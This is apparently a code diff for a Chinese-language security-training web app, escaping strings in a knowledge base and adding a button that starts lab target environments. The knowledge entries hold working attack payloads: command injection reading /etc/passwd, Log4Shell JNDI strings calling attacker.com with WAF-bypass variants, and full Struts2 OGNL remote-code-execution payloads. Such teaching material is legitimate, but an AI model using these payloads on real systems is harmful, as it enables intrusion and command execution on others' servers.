@@ -24,6 +24,7 @@ import {
   faHdd
 } from '@fortawesome/free-solid-svg-icons';
 import TerminalFeature from '../components/TerminalPanel';
+import { startTargetEnvironment } from '../services/targetService';
 
 // 知识库数据 - 实际应用中可从API获取
 const knowledgeData = {
@@ -376,7 +377,7 @@ const knowledgeData = {
         examples: [
           "使用反引号代替管道: ping `cat /etc/passwd`",
           "使用$()替代反引号: ping $(cat /etc/passwd)",
-          "使用连接符避开空格过滤: cat${IFS}/etc/passwd",
+          "使用连接符避开空格过滤: cat\\${IFS}/etc/passwd",
           "多级编码: $(echo '63 61 74 20 2f 65 74 63 2f 70 61 73 73 77 64' | xxd -p -r)"
         ],
         difficulty: 'intermediate'
@@ -850,9 +851,9 @@ const knowledgeData = {
         title: 'Log4j典型漏洞利用',
         content: 'Log4j是Apache基金会的流行Java日志组件，2021年底发现的Log4Shell漏洞(CVE-2021-44228)是近年最严重的安全漏洞之一。这个JNDI注入漏洞允许通过日志消息执行远程代码，影响了全球数百万系统。',
         examples: [
-          "基本JNDI注入(CVE-2021-44228):\n${jndi:ldap://attacker.com/exploit} 插入到被记录的字段中",
-          "绕过WAF技术:\n${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/exploit}",
-          "其他协议利用:\n${jndi:rmi://attacker.com/exploit}\n${jndi:dns://attacker.com/exploit}",
+          "基本JNDI注入(CVE-2021-44228):\n\\${jndi:ldap://attacker.com/exploit} 插入到被记录的字段中",
+          "绕过WAF技术:\n\\${\\${lower:j}\\${lower:n}\\${lower:d}\\${lower:i}:\\${lower:l}\\${lower:d}\\${lower:a}\\${lower:p}://attacker.com/exploit}",
+          "其他协议利用:\n\\${jndi:rmi://attacker.com/exploit}\n\\${jndi:dns://attacker.com/exploit}",
           "常见攻击向量:\n- HTTP头(User-Agent, X-Forwarded-For)\n- 表单字段\n- JSON字段\n- 文件名\n- 任何被记录的用户输入"
         ],
         difficulty: 'intermediate'
@@ -928,7 +929,7 @@ const knowledgeData = {
           "S2-057(CVE-2018-11776): 命名空间值与OGNL表达式注入\n/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29%28%23cmd%3D%22id%22%29%28%23iswin%3D%28%40java.lang.System%40getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%29%29%28%23cmds%3D%28%23iswin%3F%7B%22cmd.exe%22%2C%22%2Fc%22%2C%23cmd%7D%3A%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%23cmd%7D%29%29%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29%28%23p.redirectErrorStream%28true%29%29%28%40org.apache.commons.io.IOUtils%40toString%28%23p.start%28%29.getInputStream%28%29%29%29%7D/actionChain1.action",
           "S2-045(CVE-2017-5638): Content-Type头OGNL注入\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
           "S2-032(CVE-2016-3081): 方法调用时的OGNL注入\n/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=&encoding=UTF-8&cmd=id",
-          "S2-016(CVE-2013-2251): 参数值OGNL注入\nredirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
+          "S2-016(CVE-2013-2251): 参数值OGNL注入\nredirect:\\${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
         ],
         difficulty: 'expert'
       },
@@ -1185,15 +1186,52 @@ const knowledgeData = {
 };
 
 function KnowledgeDetail() {
-  const { categoryId } = useParams();
+  const { categoryId } = useParams(); // 路由参数名是categoryId，而不是id
+  const [loading, setLoading] = useState(false);
   const [category, setCategory] = useState(null);
-  const [loading, setLoading] = useState(true);
+  const [activeSection, setActiveSection] = useState(null);
+  const [targetEnvStatus, setTargetEnvStatus] = useState({ loading: false, error: null, url: null });
+
+  // 处理实验按钮点击
+  const handleExperimentClick = async (section) => {
+    setActiveSection(section);
+    // 设置状态为加载中
+    setTargetEnvStatus({ loading: true, error: null, url: null });
+    
+    try {
+      // 启动对应的靶场环境
+      const result = await startTargetEnvironment(categoryId, section.title);
+      
+      if (result.error) {
+        // 处理错误
+        setTargetEnvStatus({ loading: false, error: result.message, url: null });
+      } else {
+        // 成功启动环境
+        setTargetEnvStatus({ 
+          loading: false, 
+          error: null, 
+          url: result.url,
+          containerName: result.containerName,
+          port: result.port 
+        });
+        
+        // 可以选择自动在新窗口打开环境
+        if (result.url) {
+          window.open(result.url, '_blank');
+        }
+      }
+    } catch (error) {
+      console.error('启动环境失败:', error);
+      setTargetEnvStatus({ loading: false, error: error.message, url: null });
+    }
+  };
 
   useEffect(() => {
     setLoading(true);
     
     // 模拟API请求
     setTimeout(() => {
+      // 检查知识库中是否有对应categoryId的数据
       if (knowledgeData[categoryId]) {
         setCategory(knowledgeData[categoryId]);
       }
@@ -1205,7 +1243,6 @@ function KnowledgeDetail() {
   if (loading) {
     return (
       <main className="max-w-7xl mx-auto px-4 py-8 relative">
-        <TerminalFeature />
         <div className="bg-[#222222] rounded-lg p-6">
           <div className="flex items-center justify-center py-10">
             <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-b-2 border-primary"></div>
@@ -1219,7 +1256,6 @@ function KnowledgeDetail() {
   if (!category) {
     return (
       <main className="max-w-7xl mx-auto px-4 py-8 relative">
-        <TerminalFeature />
         <div className="bg-[#222222] rounded-lg p-6">
           <Link to="/knowledge" className="text-primary hover:text-primary/90 mb-6 inline-flex items-center">
             <FontAwesomeIcon icon={faArrowLeft} className="mr-2" />
@@ -1321,12 +1357,33 @@ function KnowledgeDetail() {
                     <FontAwesomeIcon icon={faBook} className="mr-1" />
                     学习
                   </button>
-                  <button className="bg-primary hover:bg-primary/90 text-white px-3 py-1 rounded flex items-center text-sm transition-colors duration-200">
+                  <button 
+                    className="bg-primary hover:bg-primary/90 text-white px-3 py-1 rounded flex items-center text-sm transition-colors duration-200"
+                    onClick={() => handleExperimentClick(section)}
+                    disabled={targetEnvStatus.loading}
+                  >
                     <FontAwesomeIcon icon={faPlayCircle} className="mr-1" />
                     实验
+                    {targetEnvStatus.loading && activeSection?.title === section.title && (
+                      <span className="ml-1 animate-spin">⋯</span>
+                    )}
                   </button>
                 </div>
               </div>
+
+              {targetEnvStatus.error && activeSection?.title === section.title && (
+                <div className="mt-2 text-red-400 text-sm">
+                  <FontAwesomeIcon icon={faExclamationTriangle} className="mr-1" />
+                  {targetEnvStatus.error}
+                </div>
+              )}
+              
+              {targetEnvStatus.url && activeSection?.title === section.title && !targetEnvStatus.error && (
+                <div className="mt-2 text-green-400 text-sm">
+                  <FontAwesomeIcon icon={faCheckCircle} className="mr-1" />
+                  环境已启动: <a href={targetEnvStatus.url} target="_blank" rel="noopener noreferrer" className="underline">{targetEnvStatus.url}</a>
+                </div>
+              )}
             </div>
           ))}
         </div>
